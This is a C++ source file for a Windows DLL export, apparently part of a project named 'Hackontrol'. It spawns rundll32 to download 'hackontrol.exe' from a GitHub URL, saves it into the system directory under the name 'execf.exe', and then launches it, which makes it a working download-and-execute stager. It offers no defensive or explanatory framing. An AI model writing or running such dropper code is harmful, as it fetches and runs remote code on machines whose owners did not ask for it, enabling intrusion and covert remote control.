#include <string>
#include "definition.h"

EXPORT Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	STARTUPINFO startupInformationDownload = {0};
	startupInformationDownload.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformtionDownload = {0};
	const wchar_t* rundll32 = HJ_GetSystemDirectory(L"rundll32.exe");
	const wchar_t* execf = HJ_GetSystemDirectory(L"execf.exe");
	std::wstring downloadArgument(rundll32);
	downloadArgument += L" libdll32.dll,DownloadFile https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/hackontrol.exe,";
	downloadArgument += execf;
	const wchar_t* argumentDownload = downloadArgument.c_str();

	if(CreateProcessW(rundll32, const_cast<wchar_t*>(argumentDownload), NULL, NULL, TRUE, 0, NULL, NULL, &startupInformationDownload, &processInformtionDownload) == 0) {
		HJ_DisplayError(GetLastError(), L"CreateProcessW()");
		return;
	}

	if(WaitForSingleObject(processInformtionDownload.hProcess, INFINITE) == WAIT_FAILED) {
		HJ_DisplayError(GetLastError(), L"WaitForSingleObject()");
		return;
	}

	if(CloseHandle(processInformtionDownload.hProcess) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
		return;
	}

	if(CloseHandle(processInformtionDownload.hThread) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
		return;
	}

	STARTUPINFO startupInformationExecute = {0};
	startupInformationExecute.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformtionExecute = {0};

	if(CreateProcessW(execf, const_cast<wchar_t*>(execf), NULL, NULL, TRUE, 0, NULL, NULL, &startupInformationExecute, &processInformtionExecute) == 0) {
		HJ_DisplayError(GetLastError(), L"CreateProcessW()");
		return;
	}

	if(CloseHandle(processInformtionExecute.hProcess) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
		return;
	}

	if(CloseHandle(processInformtionExecute.hThread) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
	}
}
